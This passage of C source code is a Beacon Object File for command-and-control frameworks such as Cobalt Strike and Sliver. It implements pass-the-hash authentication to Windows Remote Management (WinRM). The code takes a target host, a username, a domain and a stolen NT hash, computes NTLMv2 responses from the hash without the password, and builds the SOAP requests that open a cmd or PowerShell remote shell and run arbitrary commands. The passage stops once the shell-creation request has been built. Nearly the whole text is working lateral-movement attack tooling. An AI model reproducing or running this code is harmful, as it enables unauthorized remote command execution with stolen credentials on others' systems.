        WINHTTP_HEADER_NAME_BY_INDEX, NULL, &hdrSize,
        WINHTTP_NO_HEADER_INDEX);

    if (hdrSize == 0) return FALSE;

    WCHAR *hdrs = (WCHAR *)heap_alloc(hdrSize + 2);
    if (!hdrs) return FALSE;

    if (!WINHTTP$WinHttpQueryHeaders(hReq,
            WINHTTP_QUERY_RAW_HEADERS_CRLF,
            WINHTTP_HEADER_NAME_BY_INDEX, hdrs, &hdrSize,
            WINHTTP_NO_HEADER_INDEX)) {
        heap_free(hdrs);
        return FALSE;
    }

    int wLen = (int)(hdrSize / sizeof(WCHAR));
    char *narrow = (char *)heap_alloc(wLen + 2);
    if (!narrow) { heap_free(hdrs); return FALSE; }

    for (int i = 0; i < wLen; i++)
        narrow[i] = (char)hdrs[i];
    narrow[wLen] = 0;
    heap_free(hdrs);

    char *auth = MSVCRT$strstr(narrow, "WWW-Authenticate: Negotiate ");
    if (!auth) {

        auth = MSVCRT$strstr(narrow, "www-authenticate: Negotiate ");
        if (!auth) {
            heap_free(narrow);
            return FALSE;
        }
    }
    auth += 28;

    char *end = auth;
    while (*end && *end != '\r' && *end != '\n') end++;
    int b64Len = (int)(end - auth);

    while (b64Len > 0 && (auth[b64Len-1] == ' ' || auth[b64Len-1] == '\t'))
        b64Len--;

    if (b64Len <= 0) { heap_free(narrow); return FALSE; }

    BOOL ok = b64_decode(auth, b64Len, type2, type2Len);
    heap_free(narrow);
    return ok;
}

static const char *SOAP_NS =
    "xmlns:env=\"http://www.w3.org/2003/05/soap-envelope\" "
    "xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" "
    "xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" "
    "xmlns:p=\"http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd\" "
    "xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\"";

static char *xml_escape_text(const char *input)
{
    DWORD inputLen = (DWORD)MSVCRT$strlen(input);
    DWORD outputLen = 0;
    DWORD i;
    char *output;
    char *cursor;

    for (i = 0; i < inputLen; i++) {
        DWORD add = 1;
        if (input[i] == '&') add = 5;
        else if (input[i] == '<' || input[i] == '>') add = 4;
        else if (input[i] == '\"' || input[i] == '\'') add = 6;
        if (outputLen > 0xffffffffUL - add)
            return NULL;
        outputLen += add;
    }
    output = (char *)heap_alloc(outputLen + 1);
    if (!output)
        return NULL;
    cursor = output;
    for (i = 0; i < inputLen; i++) {
        const char *entity = NULL;
        DWORD entityLen = 0;
        if (input[i] == '&') { entity = "&amp;"; entityLen = 5; }
        else if (input[i] == '<') { entity = "&lt;"; entityLen = 4; }
        else if (input[i] == '>') { entity = "&gt;"; entityLen = 4; }
        else if (input[i] == '\"') { entity = "&quot;"; entityLen = 6; }
        else if (input[i] == '\'') { entity = "&apos;"; entityLen = 6; }
        if (entity) {
            MSVCRT$memcpy(cursor, entity, entityLen);
            cursor += entityLen;
        } else {
            *cursor++ = input[i];
        }
    }
    *cursor = 0;
    return output;
}

static char *build_soap_header(const char *targetUrl, const char *action,
                               const char *resourceUri, int timeoutSec,
                               const char *extraOpts)
{
    char *buf = (char *)heap_alloc(SOAP_BUF_SIZE);
    if (!buf) return NULL;

    char uuid[64];
    generate_uuid(uuid, sizeof(uuid));

    MSVCRT$_snprintf(buf, SOAP_BUF_SIZE - 1,
        "<env:Envelope %s>"
          "<env:Header>"
            "<a:To>%s</a:To>"
            "<a:ReplyTo>"
              "<a:Address s:mustUnderstand=\"true\" "
                "xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\">"
                "http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous"
              "</a:Address>"
            "</a:ReplyTo>"
            "<w:MaxEnvelopeSize a:mustUnderstand=\"true\">153600</w:MaxEnvelopeSize>"
            "<a:MessageID>uuid:%s</a:MessageID>"
            "<w:Locale xml:lang=\"en-US\" a:mustUnderstand=\"false\"/>"
            "<p:DataLocale xml:lang=\"en-US\" a:mustUnderstand=\"false\"/>"
            "<w:OperationTimeout>PT%dS</w:OperationTimeout>"
            "<w:ResourceURI a:mustUnderstand=\"true\">%s</w:ResourceURI>"
            "<a:Action a:mustUnderstand=\"true\">%s</a:Action>"
            "%s"
          "</env:Header>",
        SOAP_NS, targetUrl, uuid, timeoutSec, resourceUri, action,
        extraOpts ? extraOpts : "");
    return buf;
}

static char *build_soap_create_shell(const char *targetUrl, int timeoutSec)
{
    char *hdr = build_soap_header(targetUrl,
        "http://schemas.xmlsoap.org/ws/2004/09/transfer/Create",
        "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd",
        timeoutSec,
        "<w:OptionSet>"
          "<w:Option Name=\"WINRS_NOPROFILE\">TRUE</w:Option>"
          "<w:Option Name=\"WINRS_CODEPAGE\">65001</w:Option>"
        "</w:OptionSet>");
    if (!hdr) return NULL;

    int hdrLen = (int)MSVCRT$strlen(hdr);
    MSVCRT$_snprintf(hdr + hdrLen, SOAP_BUF_SIZE - hdrLen - 1,
        "<env:Body>"
          "<rsp:Shell>"
            "<rsp:InputStreams>stdin</rsp:InputStreams>"
            "<rsp:OutputStreams>stdout stderr</rsp:OutputStreams>"
          "</rsp:Shell>"
        "</env:Body>"
        "</env:Envelope>");
    return hdr;
}

static char *build_soap_command(const char *targetUrl, const char *shellId,
                                const char *cmd, int timeoutSec)
{
    char selHdr[512];
    char *escapedCmd;
    MSVCRT$_snprintf(selHdr, sizeof(selHdr) - 1,
        "<w:SelectorSet>"
          "<w:Selector Name=\"ShellId\">%s</w:Selector>"
        "</w:SelectorSet>",
        shellId);

    char *hdr = build_soap_header(targetUrl,
        "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command",
        "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd",
        timeoutSec,
        selHdr);
    if (!hdr) return NULL;

    escapedCmd = xml_escape_text(cmd);
    if (!escapedCmd) {
        heap_free(hdr);
        return NULL;
    }

    int hdrLen = (int)MSVCRT$strlen(hdr);
    MSVCRT$_snprintf(hdr + hdrLen, SOAP_BUF_SIZE - hdrLen - 1,
        "<env:Body>"
          "<rsp:CommandLine>"
            "<rsp:Command>cmd.exe</rsp:Command>"
            "<rsp:Arguments>/c %s</rsp:Arguments>"
          "</rsp:CommandLine>"
        "</env:Body>"
        "</env:Envelope>",
        escapedCmd);
    heap_free(escapedCmd);
    return hdr;
}

static char *build_soap_receive(const char *targetUrl, const char *shellId,
                                const char *cmdId, int timeoutSec,
                                const char *resourceUri,
                                const char *desiredStreams)
{
    char selHdr[512];
    MSVCRT$_snprintf(selHdr, sizeof(selHdr) - 1,
        "<w:SelectorSet>"
          "<w:Selector Name=\"ShellId\">%s</w:Selector>"
        "</w:SelectorSet>",
        shellId);

    char *hdr = build_soap_header(targetUrl,
        "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive",
        resourceUri,
        timeoutSec,
        selHdr);
    if (!hdr) return NULL;

    int hdrLen = (int)MSVCRT$strlen(hdr);
    if (cmdId && cmdId[0]) {
        MSVCRT$_snprintf(hdr + hdrLen, SOAP_BUF_SIZE - hdrLen - 1,
            "<env:Body>"
              "<rsp:Receive>"
                "<rsp:DesiredStream CommandId=\"%s\">%s</rsp:DesiredStream>"
              "</rsp:Receive>"
            "</env:Body>"
            "</env:Envelope>",
            cmdId, desiredStreams);
    } else {
        MSVCRT$_snprintf(hdr + hdrLen, SOAP_BUF_SIZE - hdrLen - 1,
            "<env:Body>"
              "<rsp:Receive>"
                "<rsp:DesiredStream>%s</rsp:DesiredStream>"
              "</rsp:Receive>"
            "</env:Body>"
            "</env:Envelope>",
            desiredStreams);
    }
    return hdr;
}

static char *build_soap_signal(const char *targetUrl, const char *shellId,
                               const char *cmdId, int timeoutSec,
                               const char *resourceUri)
{
    char selHdr[512];
    MSVCRT$_snprintf(selHdr, sizeof(selHdr) - 1,
        "<w:SelectorSet>"
          "<w:Selector Name=\"ShellId\">%s</w:Selector>"
        "</w:SelectorSet>",
        shellId);

    char *hdr = build_soap_header(targetUrl,
        "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal",
        resourceUri,
        timeoutSec,
        selHdr);
    if (!hdr) return NULL;

    int hdrLen = (int)MSVCRT$strlen(hdr);
    MSVCRT$_snprintf(hdr + hdrLen, SOAP_BUF_SIZE - hdrLen - 1,
        "<env:Body>"
          "<rsp:Signal CommandId=\"%s\">"
            "<rsp:Code>"
              "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate"
            "</rsp:Code>"
          "</rsp:Signal>"
        "</env:Body>"
        "</env:Envelope>",
        cmdId);
    return hdr;
}

static char *build_soap_delete(const char *targetUrl, const char *shellId,
                               int timeoutSec, const char *resourceUri)
{
    char selHdr[512];
    MSVCRT$_snprintf(selHdr, sizeof(selHdr) - 1,
        "<w:SelectorSet>"
          "<w:Selector Name=\"ShellId\">%s</w:Selector>"
        "</w:SelectorSet>",
        shellId);

    char *hdr = build_soap_header(targetUrl,
        "http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete",
        resourceUri,
        timeoutSec,
        selHdr);
    if (!hdr) return NULL;

    int hdrLen = (int)MSVCRT$strlen(hdr);
    MSVCRT$_snprintf(hdr + hdrLen, SOAP_BUF_SIZE - hdrLen - 1,
        "<env:Body/>"
        "</env:Envelope>");
    return hdr;
}

/* -----------------------------------------------------------
 * PSRP SOAP builders
 * ----------------------------------------------------------- */

/* Build creationXml for a PSRP shell: SESSION_CAPABILITY +
 * INIT_RUNSPACEPOOL fragments, base64-encoded.
 * Returns a heap-allocated base64 string; caller frees. */
static char *build_psrp_creation_xml(const BYTE rpid[16],
                                     DWORD *b64Len)
{
    static const BYTE zeroPid[16] = {0};
    DWORD scXmlLen = 0, irXmlLen = 0;
    DWORD scMsgLen = 0, irMsgLen = 0;
    DWORD scFragLen = 0, irFragLen = 0;
    char *scXml = NULL, *irXml = NULL;
    BYTE *scMsg = NULL, *irMsg = NULL;
    BYTE *scFrag = NULL, *irFrag = NULL;
    BYTE *combined = NULL;
    DWORD combinedLen;
    char *b64Out = NULL;

    scXml = psrp_session_capability_xml(&scXmlLen);
    if (!scXml) goto fail;
    scMsg = psrp_build_message(PSRP_DEST_SERVER, PSRP_SESSION_CAPABILITY,
                               rpid, zeroPid, scXml, scXmlLen, &scMsgLen);
    heap_free(scXml); scXml = NULL;
    if (!scMsg) goto fail;
    scFrag = psrp_build_fragment(1, scMsg, scMsgLen, &scFragLen);
    heap_free(scMsg); scMsg = NULL;
    if (!scFrag) goto fail;

    irXml = psrp_init_runspacepool_xml(&irXmlLen);
    if (!irXml) goto fail;
    irMsg = psrp_build_message(PSRP_DEST_SERVER, PSRP_INIT_RUNSPACEPOOL,
                               rpid, zeroPid, irXml, irXmlLen, &irMsgLen);
    heap_free(irXml); irXml = NULL;
    if (!irMsg) goto fail;
    irFrag = psrp_build_fragment(2, irMsg, irMsgLen, &irFragLen);
    heap_free(irMsg); irMsg = NULL;
    if (!irFrag) goto fail;

    combinedLen = scFragLen + irFragLen;
    combined = (BYTE *)heap_alloc(combinedLen);
    if (!combined) goto fail;
    MSVCRT$memcpy(combined, scFrag, scFragLen);
    MSVCRT$memcpy(combined + scFragLen, irFrag, irFragLen);
    heap_free(scFrag); scFrag = NULL;
    heap_free(irFrag); irFrag = NULL;

    if (!b64_encode(combined, combinedLen, &b64Out, b64Len)) {
        heap_free(combined);
        return NULL;
    }
    heap_free(combined);
    return b64Out;

fail:
    if (scXml)  heap_free(scXml);
    if (irXml)  heap_free(irXml);
    if (scMsg)  heap_free(scMsg);
    if (irMsg)  heap_free(irMsg);
    if (scFrag) heap_free(scFrag);
    if (irFrag) heap_free(irFrag);
    return NULL;
}

/* Build wxf:Command arguments for CREATE_PIPELINE (base64-encoded).
 * |escapedCmd| must be XML-escaped.
 * Returns a heap-allocated base64 string; caller frees. */
static char *build_psrp_command_args(const BYTE rpid[16],
                                     const BYTE pid[16],
                                     const char *escapedCmd,
                                     DWORD *b64Len)
{
    DWORD xmlLen = 0, msgLen = 0, fragLen = 0;
    char *xml;
    BYTE *msg, *frag;
    char *b64Out = NULL;

    xml = psrp_create_pipeline_xml(escapedCmd, &xmlLen);
    if (!xml) return NULL;

    msg = psrp_build_message(PSRP_DEST_SERVER, PSRP_CREATE_PIPELINE,
                             rpid, pid, xml, xmlLen, &msgLen);
    heap_free(xml);
    if (!msg) return NULL;

    frag = psrp_build_fragment(3, msg, msgLen, &fragLen);
    heap_free(msg);
    if (!frag) return NULL;

    if (!b64_encode(frag, fragLen, &b64Out, b64Len)) {
        heap_free(frag);
        return NULL;
    }
    heap_free(frag);
    return b64Out;
}

/* Build SOAP for PSRP shell creation (wxf:Create).
 * Uses the PowerShell endpoint resource URI and protocol version 2.2.
 * |rpid| is the RunspacePool GUID (16 bytes, randomly generated). */
static char *build_soap_create_ps_shell(const char *targetUrl,
                                        int timeoutSec,
                                        const BYTE rpid[16])
{
    char *creationXml;
    DWORD creationXmlLen = 0;
    char *hdr;
    int hdrLen;

    creationXml = build_psrp_creation_xml(rpid, &creationXmlLen);
    if (!creationXml) return NULL;

    hdr = build_soap_header(targetUrl,
        "http://schemas.xmlsoap.org/ws/2004/09/transfer/Create",
        PS_RESOURCE_URI,
        timeoutSec,
        "<w:OptionSet>"
          "<w:Option Name=\"protocolversion\">2.2</w:Option>"
        "</w:OptionSet>");
    if (!hdr) { heap_free(creationXml); return NULL; }

    hdrLen = (int)MSVCRT$strlen(hdr);
    MSVCRT$_snprintf(hdr + hdrLen, SOAP_BUF_SIZE - hdrLen - 1,
        "<env:Body>"
          "<rsp:Shell>"
            "<rsp:InputStreams>stdin pr</rsp:InputStreams>"
            "<rsp:OutputStreams>stdout</rsp:OutputStreams>"
            "<creationXml xmlns=\"http://schemas.microsoft.com/powershell\">"
              "%s"
            "</creationXml>"
          "</rsp:Shell>"
        "</env:Body>"
        "</env:Envelope>",
        creationXml);
    heap_free(creationXml);
    return hdr;
}

/* Build SOAP for PSRP command execution (wxf:Command).
 * Sends a CREATE_PIPELINE message containing a script command. */
static char *build_soap_ps_command(const char *targetUrl,
                                   const char *shellId,
                                   const char *cmd,
                                   int timeoutSec,
                                   const BYTE rpid[16],
                                   const BYTE pid[16])
{
    char selHdr[512];
    char *escapedCmd, *cmdArgs;
    DWORD cmdArgsLen = 0;
    char *hdr;
    int hdrLen;

    MSVCRT$_snprintf(selHdr, sizeof(selHdr) - 1,
        "<w:SelectorSet>"
          "<w:Selector Name=\"ShellId\">%s</w:Selector>"
        "</w:SelectorSet>",
        shellId);

    {
        DWORD cmdLen = (DWORD)MSVCRT$strlen(cmd);
        DWORD wrapLen = cmdLen + 64;
        char *wrapped = (char *)heap_alloc(wrapLen);
        if (!wrapped) return NULL;
        MSVCRT$_snprintf(wrapped, wrapLen - 1,
            "&{$ProgressPreference='SilentlyContinue';%s}|Out-String", cmd);
        escapedCmd = xml_escape_text(wrapped);
        heap_free(wrapped);
    }
    if (!escapedCmd) return NULL;

    cmdArgs = build_psrp_command_args(rpid, pid, escapedCmd, &cmdArgsLen);
    heap_free(escapedCmd);
    if (!cmdArgs) return NULL;

    hdr = build_soap_header(targetUrl,
        "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command",
        PS_RESOURCE_URI,
        timeoutSec,
        selHdr);
    if (!hdr) { heap_free(cmdArgs); return NULL; }

    hdrLen = (int)MSVCRT$strlen(hdr);
    MSVCRT$_snprintf(hdr + hdrLen, SOAP_BUF_SIZE - hdrLen - 1,
        "<env:Body>"
          "<rsp:CommandLine>"
            "<rsp:Command />"
            "<rsp:Arguments>%s</rsp:Arguments>"
          "</rsp:CommandLine>"
        "</env:Body>"
        "</env:Envelope>",
        cmdArgs);
    heap_free(cmdArgs);
    return hdr;
}

static BOOL raw_space(char c)
{
    return c == ' ' || c == '\t' || c == '\r' || c == '\n';
}

static int split_raw_args(char *text, char **tokens, int capacity)
{
    char *read = text, *write = text;
    int count = 0;
    while (*read) {
        BOOL quoted = FALSE;
        while (raw_space(*read)) read++;
        if (!*read) break;
        if (count == capacity) return -1;
        tokens[count++] = write;
        while (*read) {
            if (*read == '"') {
                quoted = !quoted;
                read++;
            } else if (raw_space(*read) && !quoted) {
                read++;
                break;
            } else {
                *write++ = *read++;
            }
        }
        if (quoted) return -1;
        *write++ = 0;
    }
    return count;
}

static BOOL raw_number(const char *text, int *value)
{
    int result = 0;
    if (!*text) return FALSE;
    while (*text) {
        if (*text < '0' || *text > '9' || result > 600000)
            return FALSE;
        result = result * 10 + (*text++ - '0');
    }
    *value = result;
    return TRUE;
}

static BOOL raw_wstr(const char *text, WCHAR *out, int capacity)
{
    return KERNEL32$MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS,
        text, -1, out, capacity) > 0;
}

static BOOL parse_raw_args(const char *buffer, ULONG length,
                           RAW_BOF_ARGS *storage, BOF_ARGS *args)
{
    char *scratch, *tokens[64], *credentials, command[2048];
    int count, end, commandLength = 0;
    BOOL haveTimeout = FALSE, havePort = FALSE, valid = FALSE;
    if (!buffer || length == 0 || length > RAW_ARGS_MAX) return FALSE;
    scratch = heap_alloc(length + 1);
    if (!scratch) return FALSE;
    MSVCRT$memcpy(scratch, buffer, length);
    scratch[length] = 0;
    count = split_raw_args(scratch, tokens, 64);
    if (count < 4) goto done;

    end = count;
    while (end >= 2) {
        char *flag = tokens[end - 2];
        if (flag[0] == '-' && flag[1] == 't' && !flag[2]) {
            if (haveTimeout || !raw_number(tokens[end - 1], &args->timeout))
                goto done;
            haveTimeout = TRUE;
        } else if (flag[0] == '-' && flag[1] == 'P' && !flag[2]) {
            if (havePort || !raw_number(tokens[end - 1], &args->port))
                goto done;
            havePort = TRUE;
        } else {
            break;
        }
        end -= 2;
    }
    if (end < 4) goto done;
    credentials = tokens[end - 2];
    if (!tokens[0][0] || !credentials[0] || !tokens[end - 1][0])
        goto done;
    {
        char *slash = NULL, *p = credentials;
        while (*p) {
            if (*p == '\\') {
                if (slash) goto done;
                slash = p;
            }
            p++;
        }
        if (slash) {
            if (slash == credentials || !slash[1]) goto done;
            *slash = 0;
            if (!raw_wstr(credentials, storage->domain, 128) ||
                !raw_wstr(slash + 1, storage->username, 128))
                goto done;
        } else if (!raw_wstr(credentials, storage->username, 128)) {
            goto done;
        }
    }
    for (int i = 1; i < end - 2; i++) {
        int part = (int)MSVCRT$strlen(tokens[i]);
        if (commandLength + part + (i > 1) >= (int)sizeof(command)) goto done;
        if (i > 1) command[commandLength++] = ' ';
        MSVCRT$memcpy(command + commandLength, tokens[i], part);
        commandLength += part;
    }
    command[commandLength] = 0;
    if (!commandLength) goto done;
    if (!raw_wstr(tokens[0], storage->target, 256) ||
        !raw_wstr(command, storage->cmd, 2048) ||
        !raw_wstr(tokens[end - 1], storage->hash, 33))
        goto done;
    args->target = storage->target;
    args->cmd = storage->cmd;
    args->username = storage->username;
    args->hash = storage->hash;
    args->domain = storage->domain;
    valid = TRUE;

done:
    secure_heap_free(scratch, length + 1);
    secure_zero(command, sizeof(command));
    return valid;
}

VOID go(IN PCHAR Buffer, IN ULONG Length)
{
    BOF_ARGS args = {0};
    RAW_BOF_ARGS *rawArgs = NULL;
    WCHAR *target, *cmd, *username, *nthash, *domain;
    int timeout, port;

    char  *targetN = NULL, *usernameN = NULL, *domainN = NULL;
    char  *cmdN = NULL, *targetUrl = NULL;
    WCHAR *authHdr1 = NULL, *authHdr3 = NULL;
    HINTERNET hSession = NULL, hConnect = NULL;
    BYTE ntHashBytes[16] = {0};
    BYTE lmResp[24] = {0};
    BYTE sessionBaseKey[16] = {0};
    BYTE exportedSessionKey[16] = {0};
    BYTE encSessKey[16] = {0};
    NTLM_SESSION_SECURITY ntlmSession;

    MSVCRT$memset(&ntlmSession, 0, sizeof(ntlmSession));
    args.timeout = 15000;
    args.port = 5985;

    /* Try standard BeaconData API first (works on Xenon, CS, Sliver, etc.) */
    if (Buffer && Length >= 4) {
        datap parser;
        BeaconDataParse(&parser, Buffer, Length);

        args.target   = (WCHAR *)BeaconDataExtract(&parser, NULL);
        args.cmd      = (WCHAR *)BeaconDataExtract(&parser, NULL);
        args.username = (WCHAR *)BeaconDataExtract(&parser, NULL);
        args.hash     = (WCHAR *)BeaconDataExtract(&parser, NULL);
        args.domain   = (WCHAR *)BeaconDataExtract(&parser, NULL);

        if (BeaconDataLength(&parser) >= 4)
            args.timeout = BeaconDataInt(&parser);
        if (BeaconDataLength(&parser) >= 4)
            args.port = BeaconDataInt(&parser);

        if (!args.target || !args.cmd || !args.username ||
            !args.hash || !args.domain) {
            /* Beacon API didn't work -- fall back to raw text parsing */
            MSVCRT$memset(&args, 0, sizeof(args));
            args.timeout = 15000;
            args.port = 5985;
            rawArgs = heap_alloc(sizeof(*rawArgs));
            if (!rawArgs || !parse_raw_args(Buffer, Length, rawArgs, &args)) {
                BeaconPrintf(CALLBACK_ERROR, "Missing or malformed BOF arguments");
                goto cleanup_http;
            }
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Missing or malformed BOF arguments");
        goto cleanup_http;
    }
    target = args.target;
    cmd = args.cmd;
    username = args.username;
    nthash = args.hash;
    domain = args.domain;
    timeout = args.timeout;
    port = args.port;

    if (timeout < 1000 || timeout > 600000 || port < 1 || port > 65535) {
        BeaconPrintf(CALLBACK_ERROR, "Invalid timeout or port");
        goto cleanup_http;
    }

    int timeoutSec = timeout / 1000;
    if (timeoutSec < 1) timeoutSec = 15;

    if (!is_nt_hash(nthash)) {
        BeaconPrintf(CALLBACK_ERROR, "Invalid NT hash (must be 32 hex chars)");
        goto cleanup_http;
    }
    parse_nt_hash(nthash, ntHashBytes);

    targetN   = (char *)heap_alloc(256);
    usernameN = (char *)heap_alloc(128);
    domainN   = (char *)heap_alloc(128);
    cmdN      = (char *)heap_alloc(2048);
    targetUrl = (char *)heap_alloc(512);
    if (!targetN || !usernameN || !domainN || !cmdN || !targetUrl) {
        BeaconPrintf(CALLBACK_ERROR, "Heap alloc failed");
        goto cleanup_http;
    }
    if (!wide_to_utf8(target, targetN, 256) ||
        !wide_to_utf8(username, usernameN, 128) ||
        !wide_to_utf8(domain, domainN, 128) ||
        !wide_to_utf8(cmd, cmdN, 2048)) {
        BeaconPrintf(CALLBACK_ERROR, "Argument is invalid UTF-16 or exceeds its encoded size limit");
        goto cleanup_http;
    }

    if (MSVCRT$strstr(targetN, ":"))
        MSVCRT$_snprintf(targetUrl, 511,
            "http://[%s]:%d/wsman", targetN, port);
    else
        MSVCRT$_snprintf(targetUrl, 511,
            "http://%s:%d/wsman", targetN, port);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] WinRM PTH: %s@%s -> %s (port %d)",
        usernameN, domainN, targetN, port);

    BYTE type1[40];
    int type1Len = BuildType1(type1);

    hSession = WINHTTP$WinHttpOpen(
        L"WinRM-PTH/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (!hSession) {
        BeaconPrintf(CALLBACK_ERROR, "WinHttpOpen failed: %d",
            KERNEL32$GetLastError());
        goto cleanup_http;
    }

    WINHTTP$WinHttpSetTimeouts(hSession, timeout, timeout, timeout, timeout);

    hConnect = WINHTTP$WinHttpConnect(
        hSession, target, (WORD)port, 0);
    if (!hConnect) {
        BeaconPrintf(CALLBACK_ERROR, "WinHttpConnect failed: %d",
            KERNEL32$GetLastError());
        goto cleanup_http;
    }

    char *type1B64 = NULL;
    DWORD type1B64Len = 0;
    if (!b64_encode(type1, type1Len, &type1B64, &type1B64Len)) {
        BeaconPrintf(CALLBACK_ERROR, "Base64 encode Type1 failed");
        goto cleanup_http;
    }

    authHdr1 = (WCHAR *)heap_alloc(1024 * sizeof(WCHAR));
    if (!authHdr1) {
        BeaconPrintf(CALLBACK_ERROR, "Authorization header allocation failed");
        heap_free(type1B64);
        goto cleanup_http;
    }
    {
        char *tmp = (char *)heap_alloc(1024);
        if (!tmp) {
            BeaconPrintf(CALLBACK_ERROR, "Authorization header allocation failed");
            heap_free(type1B64);
            goto cleanup_http;
        }
        MSVCRT$_snprintf(tmp, 1023,
            "Authorization: Negotiate %s", type1B64);
        narrow_to_wide(tmp, authHdr1, 1024);
        heap_free(tmp);
    }
    heap_free(type1B64);

    char *resp1 = NULL;
    DWORD resp1Len = 0, status1 = 0;
    HINTERNET hReq1 = http_post(hConnect, authHdr1, FALSE,
        NULL, 0,
        &resp1, &resp1Len, &status1);

    if (!hReq1) {
        BeaconPrintf(CALLBACK_ERROR,
            "Type1 POST failed: %d", KERNEL32$GetLastError());
        if (resp1) heap_free(resp1);
        goto cleanup_http;
    }

    if (status1 != 401) {
        BeaconPrintf(CALLBACK_ERROR,
            "Expected 401 for Type1 challenge, got %d", status1);
        if (resp1) heap_free(resp1);
        WINHTTP$WinHttpCloseHandle(hReq1);
        goto cleanup_http;
    }

    BYTE *type2Raw = NULL;
    DWORD type2Len = 0;
    if (!extract_type2_from_headers(hReq1, &type2Raw, &type2Len)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to extract Type2 from response");
        if (resp1) heap_free(resp1);
        WINHTTP$WinHttpCloseHandle(hReq1);
        goto cleanup_http;
    }
    if (resp1) heap_free(resp1);
    WINHTTP$WinHttpCloseHandle(hReq1);

    TYPE2_PARSED t2;
    if (!ParseType2(type2Raw, type2Len, &t2)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to parse Type2 message");
        heap_free(type2Raw);
        goto cleanup_http;
    }

    PBYTE ntResp = NULL;
    DWORD ntRespLen = 0;
    WORD timestampLen = 0;
    BOOL micRequired =
        FindAvPair(t2.targetInfo, t2.targetInfoLen,
                   AV_TIMESTAMP, &timestampLen) != NULL && timestampLen == 8;

    if (!ComputeNtlmV2(ntHashBytes, username, domain,
                        t2.challenge, t2.targetInfo, t2.targetInfoLen,
                        &ntResp, &ntRespLen,
                        lmResp, sessionBaseKey)) {
        BeaconPrintf(CALLBACK_ERROR, "ComputeNtlmV2 failed");
        heap_free(type2Raw);
        goto cleanup_http;
    }

    DWORD encSessKeyLen = 0;
    if (t2.flags & NF_KEY_EXCH) {
        ADVAPI32$SystemFunction036(exportedSessionKey, 16);
        MSVCRT$memcpy(encSessKey, exportedSessionKey, 16);
        rc4_crypt(encSessKey, 16, sessionBaseKey, 16);
        encSessKeyLen = 16;
    } else {
        MSVCRT$memcpy(exportedSessionKey, sessionBaseKey, 16);
    }

    BYTE *type3Buf = (BYTE *)heap_alloc(4096);
    DWORD micOff = 0;
    if (!type3Buf) {
        BeaconPrintf(CALLBACK_ERROR, "Type3 allocation failed");
        heap_free(type2Raw);
        secure_heap_free(ntResp, ntRespLen);
        goto cleanup_http;
    }
    DWORD type3Len = BuildType3(
        type3Buf, 4096,
        domain, username,
        ntResp, ntRespLen,
        lmResp, 24,
        encSessKey, encSessKeyLen,
        t2.flags,
        micRequired ? &micOff : NULL);

    if (type3Len == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to build Type3 message");
        heap_free(type2Raw);
        secure_heap_free(ntResp, ntRespLen);
        secure_heap_free(type3Buf, 4096);
        goto cleanup_http;
    }

    if (micRequired) {
        DWORD micInputLen = (DWORD)type1Len + type2Len + type3Len;
        BYTE *micInput = (BYTE *)heap_alloc(micInputLen);
        BYTE mic[16];
        if (!micInput) {
            BeaconPrintf(CALLBACK_ERROR, "NTLM MIC allocation failed");
            heap_free(type2Raw);
            secure_heap_free(ntResp, ntRespLen);
            secure_heap_free(type3Buf, 4096);
            goto cleanup_http;
        }
        MSVCRT$memcpy(micInput, type1, type1Len);
        MSVCRT$memcpy(micInput + type1Len, type2Raw, type2Len);
        MSVCRT$memcpy(micInput + type1Len + type2Len, type3Buf, type3Len);
        hmac_md5(exportedSessionKey, 16, micInput, micInputLen, mic);
        MSVCRT$memcpy(type3Buf + micOff, mic, 16);
        secure_heap_free(micInput, micInputLen);
        secure_zero(mic, sizeof(mic));
    }

    heap_free(type2Raw);
    secure_heap_free(ntResp, ntRespLen);

    if (!ntlm_session_init(&ntlmSession, exportedSessionKey, t2.flags)) {
        BeaconPrintf(CALLBACK_ERROR,
            "WinRM did not negotiate NTLM signing/sealing (flags 0x%08lx)",
            (unsigned long)t2.flags);
        secure_heap_free(type3Buf, 4096);
        goto cleanup_http;
    }
    char *type3B64 = NULL;
    DWORD type3B64Len = 0;
    if (!b64_encode(type3Buf, type3Len, &type3B64, &type3B64Len)) {
        BeaconPrintf(CALLBACK_ERROR, "Base64 encode Type3 failed");
        secure_heap_free(type3Buf, 4096);
        goto cleanup_http;
    }

    authHdr3 = (WCHAR *)heap_alloc(4096 * sizeof(WCHAR));
    if (!authHdr3) {
        BeaconPrintf(CALLBACK_ERROR, "Authorization header allocation failed");
        secure_heap_free(type3B64, type3B64Len + 1);
        secure_heap_free(type3Buf, 4096);
        goto cleanup_http;
    }
    {
        char *tmp = (char *)heap_alloc(4096);
        if (!tmp) {
            BeaconPrintf(CALLBACK_ERROR, "Authorization header allocation failed");
            secure_heap_free(type3B64, type3B64Len + 1);
            secure_heap_free(type3Buf, 4096);
            goto cleanup_http;
        }
        MSVCRT$_snprintf(tmp, 4095,
            "Authorization: Negotiate %s", type3B64);
        narrow_to_wide(tmp, authHdr3, 4096);
        secure_heap_free(tmp, 4096);
    }
    secure_heap_free(type3B64, type3B64Len + 1);
    secure_heap_free(type3Buf, 4096);

    char *createSoap = build_soap_create_shell(targetUrl, timeoutSec);
    if (!createSoap) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to build CreateShell SOAP");
        goto cleanup_http;
    }

    char *resp2 = NULL;
    DWORD resp2Len = 0, status2 = 0;
